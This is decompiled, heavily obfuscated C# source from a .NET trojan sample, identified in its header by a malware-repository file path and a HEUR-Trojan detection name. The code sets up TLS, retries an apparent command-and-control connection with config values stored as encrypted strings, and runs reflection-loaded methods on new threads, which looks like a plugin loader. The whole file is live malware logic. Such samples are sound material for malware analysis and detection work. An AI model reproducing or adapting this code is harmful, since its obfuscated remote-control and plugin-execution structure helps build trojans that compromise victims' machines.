// Decompiled with JetBrains decompiler
// Type: @ԗ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Collections.Generic;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

internal static class \u0040ԗ
{
  private static object \u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public static string \u0040Ӕ() => (string) \u0040ԗ.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public static void \u0040ӕ(object _param0) => \u0040ԗ.\u0040ӓ = _param0;

  internal sealed class \u0040ӓ
  {
    public Dictionary<string, object> \u0040ӓ;
    public Dictionary<string, string> \u0040Ӕ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040ӓ()
    {
      \u0040ԗ.\u0040ӓ.\u0040Ӛ();
      \u0040ԗ.\u0040ӓ.\u0040ӛ((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӕ()
    {
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            try
            {
              \u0040ԗ.\u0040ӓ.\u0040Ӟ(SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
            }
            catch
            {
            }
            \u0040ԝ.\u0040ٕ((bool) this.\u0040ӓ[(string) \u0040ԗ.\u0040ӓ.\u0040ӟ(555548)], (bool) this.\u0040ӓ[(string) \u0040ԗ.\u0040ӓ.\u0040ӟ(555558)], \u0040ԗ.\u0040ӓ.\u0040Ӡ(this.\u0040ӓ[(string) \u0040ԗ.\u0040ӓ.\u0040ӟ(555570)]), (string) this.\u0040ӓ[(string) \u0040ԗ.\u0040ӓ.\u0040ӟ(555580)], new Version(4, 5, 27).ToString());
            if (true)
            {
              num = 4;
              continue;
            }
            goto label_10;
          case 2:
            \u0040ԗ.\u0040ӓ.\u0040Ӟ(SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls);
            num = \u0040ԗ.\u0040ӓ.\u0040ӝ() ? 5 : 0;
            continue;
          case 4:
            \u0040ԝ.\u0040\u070B((string) this.\u0040ӓ[(string) \u0040ԗ.\u0040ӓ.\u0040ӟ(555590)]);
            break;
          case 6:
            goto label_4;
        }
        \u0040ԗ.\u0040ӓ.\u0040ӡ();
        num = 6;
      }
label_4:
      return;
label_10:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ӗ()
    {
      int num1 = 8;
      if (\u0040ԗ.\u0040ӓ.\u0040ӝ())
        ;
      while (true)
      {
        bool flag1;
        string str;
        int num2;
        bool flag2;
        bool flag3;
        switch (num1)
        {
          case 0:
            if (flag1)
            {
              if (!\u0040ԗ.\u0040ӓ.\u0040ӝ())
              {
                num1 = 2;
                continue;
              }
              if (\u0040ԗ.\u0040ӓ.\u0040Ӝ())
              {
                num1 = 9;
                continue;
              }
              goto case 8;
            }
            else
            {
              flag2 = num2 >= 15;
              num1 = 10;
              continue;
            }
          case 1:
            if (flag3)
            {
              flag1 = \u0040ԝ.\u0040ӱ(str);
              int num3 = 0;
              num1 = \u0040ԗ.\u0040ӓ.\u0040ӝ() ? num3 : num3;
              continue;
            }
            num1 = 13;
            continue;
          case 2:
            goto label_19;
          case 3:
            num2 = 0;
            num1 = 12;
            continue;
          case 4:
            goto label_17;
          case 5:
          case 12:
            flag3 = num2 < int.MaxValue;
            num1 = 1;
            continue;
          case 7:
            break;
          case 8:
            str = \u0040ԝ.\u0040\u0590((string) this.\u0040ӓ[(string) \u0040ԗ.\u0040ӓ.\u0040ӟ(555590)]);
            num1 = 3;
            continue;
          case 10:
            if (!flag2)
              break;
            goto default;
          case 11:
            ++num2;
            num1 = 5;
            continue;
          case 13:
            goto label_9;
          default:
            \u0040ԗ.\u0040ӓ.\u0040Ӣ(0);
            if (true)
            {
              num1 = 7;
              continue;
            }
            goto case 7;
        }
        \u0040ԗ.\u0040ӓ.\u0040ӣ(500);
        num1 = 11;
      }
label_19:
      return;
label_17:
      return;
label_9:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӗ() => \u0040Ԓ.\u0040ӡ(this.\u0040Ӕ);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ә()
    {
      try
      {
        bool flag = !(bool) this.\u0040ӓ[(string) \u0040ԗ.\u0040ӓ.\u0040ӟ(555258)];
        \u0040ԗ.\u0040ӓ.\u0040Ӝ();
        int num = \u0040ԗ.\u0040ӓ.\u0040ӝ() ? 2 : 3;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 3:
              if (!flag)
                goto label_5;
              else
                goto default;
            case 4:
              goto label_6;
            default:
              \u0040ԗ.\u0040ӓ.\u0040Ӥ(\u0040ԗ.\u0040ӓ.\u0040Ӡ(this.\u0040ӓ[(string) \u0040ԗ.\u0040ӓ.\u0040ӟ(555604)]));
              if (true)
              {
                num = 4;
                continue;
              }
              goto case 0;
          }
        }
label_5:
        return;
label_6:;
      }
      catch (Exception ex)
      {
        \u0040ԝ.\u0040ܦ((string) \u0040ԗ.\u0040ӓ.\u0040ӟ(555614), (string) \u0040ԗ.\u0040ӓ.\u0040ӥ((object) ex));
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ә() => \u0040ԝ.\u0040ۨ(this.\u0040ӓ, this.\u0040Ӕ);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӛ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӛ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ӝ() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ӝ() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӟ(SecurityProtocolType _param0) => ServicePointManager.SecurityProtocol = _param0;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӟ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0040Ӡ(object _param0) => Convert.ToInt32(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӡ() => GC.Collect();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӣ(int _param0) => Environment.Exit(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӣ(int _param0) => Thread.Sleep(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӥ(int _param0) => \u0040Ԟ.\u0040Ӗ(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ӥ(object _param0) => (object) ((Exception) _param0).Message;
  }

  private sealed class \u0040Ӕ
  {
    public object \u0040ӓ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040Ӕ()
    {
      \u0040ԗ.\u0040Ӕ.\u0040ӕ();
      \u0040ԗ.\u0040Ӕ.\u0040Ӗ((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ӕ()
    {
      try
      {
        \u0040ԗ.\u0040Ӕ.\u0040ә((object) (MethodInfo) this.\u0040ӓ[0], this.\u0040ӓ[1], (object) new object[3]
        {
          \u0040ԑ.\u0040ӕ,
          \u0040ԑ.\u0040ӓ,
          \u0040ԑ.\u0040ӗ
        });
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ӗ() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ә() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040ә(object _param0, object _param1, object _param2) => ((MethodBase) _param0).Invoke(_param1, (object[]) _param2);
  }

  [Serializable]
  internal sealed class YqOAaRKChtXQcq7nTAl
  {
    public static readonly object P9Ud4pihqi;
    public static Action<object[]> IQ9drTWhgg;
    public static object OuvdoCA4P4;

    [MethodImpl(MethodImplOptions.NoInlining)]
    static YqOAaRKChtXQcq7nTAl()
    {
      \u0040ԗ.YqOAaRKChtXQcq7nTAl.j6GnFREseOxn7YmJQP6();
      \u0040ԗ.YqOAaRKChtXQcq7nTAl.P9Ud4pihqi = (object) new \u0040ԗ.YqOAaRKChtXQcq7nTAl();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public YqOAaRKChtXQcq7nTAl()
    {
      \u0040ԗ.YqOAaRKChtXQcq7nTAl.j6GnFREseOxn7YmJQP6();
      \u0040ԗ.YqOAaRKChtXQcq7nTAl.TAqEy5E9OEPVYIwMr40((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void jNqdI4fbgO()
    {
      try
      {
        \u0040Ԓ.\u0040ӛ.ForEach(\u0040ԗ.YqOAaRKChtXQcq7nTAl.IQ9drTWhgg ?? (\u0040ԗ.YqOAaRKChtXQcq7nTAl.IQ9drTWhgg = new Action<object[]>(((\u0040ԗ.YqOAaRKChtXQcq7nTAl) \u0040ԗ.YqOAaRKChtXQcq7nTAl.P9Ud4pihqi).daSdNgCkyu)));
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void daSdNgCkyu(object[] _param1)
    {
      int num = 0;
      \u0040ԗ.\u0040Ӕ ӕ;
      while (true)
      {
        switch (num)
        {
          case 0:
            ӕ = new \u0040ԗ.\u0040Ӕ();
            \u0040ԗ.YqOAaRKChtXQcq7nTAl.sMWOZpEBM52tKxh5rdn();
            num = \u0040ԗ.YqOAaRKChtXQcq7nTAl.KqDLcdEyqJZMkgumEj2() ? 4 : 3;
            continue;
          case 1:
          case 3:
            ӕ.\u0040ӓ = (object) _param1;
            goto default;
          case 5:
            goto label_3;
          default:
            \u0040ԗ.YqOAaRKChtXQcq7nTAl.Ba8nchEVsKvBDUNxwSl((object) new Thread(new ThreadStart(ӕ.\u0040Ӕ)));
            if (\u0040ԗ.YqOAaRKChtXQcq7nTAl.sMWOZpEBM52tKxh5rdn())
            {
              num = 5;
              continue;
            }
            goto case 0;
        }
      }
label_3:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void j6GnFREseOxn7YmJQP6() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool sMWOZpEBM52tKxh5rdn() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool KqDLcdEyqJZMkgumEj2() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void TAqEy5E9OEPVYIwMr40([In] object obj0) => obj0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void Ba8nchEVsKvBDUNxwSl([In] object obj0) => ((Thread) obj0).Start();
  }

  internal sealed class \u0040Ӗ
  {
    public \u0040Ԫ \u0040ӓ;
    public Dictionary<string, object> \u0040Ӕ;
    public object \u0040ӕ;
    public Action<object[]> \u0040Ӗ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040Ӗ()
    {
      \u0040ԗ.\u0040Ӗ.\u0040ӛ();
      \u0040ԗ.\u0040Ӗ.\u0040Ӝ((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӗ() => \u0040Ԓ.\u0040Ӝ = this.\u0040ӓ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ә()
    {
      int num = !\u0040ԗ.\u0040Ӗ.\u0040ӝ() ? 2 : 3;
      bool flag;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            try
            {
              \u0040Ԓ.\u0040Ӛ.ForEach(this.\u0040Ӗ ?? (this.\u0040Ӗ = new Action<object[]>(this.\u0040ә)));
              \u0040Ԓ.\u0040Ӛ = new List<object[]>();
            }
            catch
            {
            }
            \u0040ԗ.\u0040Ӗ.\u0040ӟ(this.\u0040ӓ);
            goto case 1;
          case 1:
          case 2:
            flag = (bool) this.\u0040Ӕ[(string) \u0040ԗ.\u0040Ӗ.\u0040Ӡ(555632)];
            num = 4;
            continue;
          case 4:
            if (!flag)
              goto label_10;
            else
              goto case 5;
          case 5:
            \u0040ԝ.\u0040ڨ(this.\u0040ӓ);
            num = 6;
            continue;
          case 6:
            goto label_11;
          default:
            if (true)
            {
              num = 5;
              continue;
            }
            goto case 5;
        }
      }
label_10:
      return;
label_11:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ә(object[] _param1)
    {
      int num = 4;
      \u0040ԗ.\u0040ӗ ӗ;
      while (true)
      {
        switch (num)
        {
          case 0:
            \u0040ԗ.\u0040Ӗ.\u0040ӡ((object) new Thread(new ThreadStart(ӗ.\u0040ӕ)));
            num = 6;
            continue;
          case 1:
          case 5:
            ӗ.\u0040Ӕ = (object) this;
            goto case 2;
          case 2:
          case 3:
            ӗ.\u0040ӓ = (object) _param1;
            goto case 0;
          case 4:
            ӗ = new \u0040ԗ.\u0040ӗ();
            \u0040ԗ.\u0040Ӗ.\u0040ӝ();
            num = \u0040ԗ.\u0040Ӗ.\u0040Ӟ() ? 3 : 5;
            continue;
          case 6:
            goto label_2;
          default:
            num = 0;
            continue;
        }
      }
label_2:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040Ӛ()
    {
      int num1 = !\u0040ԗ.\u0040Ӗ.\u0040ӝ() ? 5 : 2;
      int num2;
      int num3;
      \u0040Ԡ ӕ;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            ӕ = (\u0040Ԡ) this.\u0040ӕ;
            goto case 1;
          case 1:
          case 5:
            num3 = \u0040ԗ.\u0040Ӗ.\u0040Ӣ(this.\u0040Ӕ[(string) \u0040ԗ.\u0040Ӗ.\u0040Ӡ(555640)]);
            num1 = 3;
            continue;
          case 3:
            num2 = \u0040ԗ.\u0040Ӗ.\u0040Ӣ(this.\u0040Ӕ[(string) \u0040ԗ.\u0040Ӗ.\u0040Ӡ(555650)]);
            goto case 4;
          case 4:
            \u0040ԝ.\u0040ӕ(num2, num3, ӕ);
            if (true)
            {
              num1 = 6;
              continue;
            }
            goto case 3;
          case 6:
            goto label_6;
          default:
            num1 = 4;
            continue;
        }
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӛ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӝ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ӝ() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ӟ() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӟ(\u0040Ԫ _param0) => \u0040ԡ.\u0040Ә(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӡ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӡ(object _param0) => ((Thread) _param0).Start();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static int \u0040Ӣ(object _param0) => Convert.ToInt32(_param0);
  }

  private sealed class \u0040ӗ
  {
    public object \u0040ӓ;
    public object \u0040Ӕ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040ӗ()
    {
      \u0040ԗ.\u0040ӗ.\u0040Ӗ();
      \u0040ԗ.\u0040ӗ.\u0040ӗ((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal void \u0040ӕ()
    {
      try
      {
        \u0040ԗ.\u0040ӗ.\u0040Ӛ((object) (MethodInfo) this.\u0040ӓ[0], this.\u0040ӓ[1], (object) new object[4]
        {
          \u0040ԑ.\u0040ӕ,
          \u0040ԑ.\u0040ӓ,
          \u0040ԑ.\u0040ӗ,
          (object) ((\u0040ԗ.\u0040Ӗ) this.\u0040Ӕ).\u0040ӓ.\u0040ӗ()
        });
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӗ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӗ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ә() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ә() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object \u0040Ӛ(object _param0, object _param1, object _param2) => ((MethodBase) _param0).Invoke(_param1, (object[]) _param2);
  }
}
